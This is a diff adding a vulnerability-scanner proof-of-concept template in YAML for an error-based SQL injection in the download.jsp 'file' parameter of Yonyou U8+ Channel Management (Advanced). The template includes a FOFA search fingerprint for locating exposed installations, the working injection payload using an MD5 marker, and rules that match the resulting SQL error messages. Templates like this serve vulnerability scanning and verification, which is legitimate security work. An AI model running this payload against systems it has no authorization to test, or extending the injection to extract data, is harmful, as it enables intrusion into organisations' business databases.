@@ -1,0 +1,29 @@
+id: poc-yaml-yongyon-u8-cm-ae-download-jsp-sqli
+info:
+  name: 用友U8+渠道管理(高级版) download.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+渠道管理(高级版)
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /indexbusiness.jsp
+  expression: status_code == 200 && contains(title,"渠道管理（高级版）")
+- method: GET
+  path: /business/common/download.jsp?filename=&foldertype=&file='+AND+9173+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))+AND+'rhYc'='rhYc
+  expression: 'status_code == 500 &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(body,"java.sql.SQLException") &&
+
+    matches(body,"转换成数据类型(.*?)时失败") &&
+
+    matches(body,"在将(.*?)值")
+
+    '
+transport: http
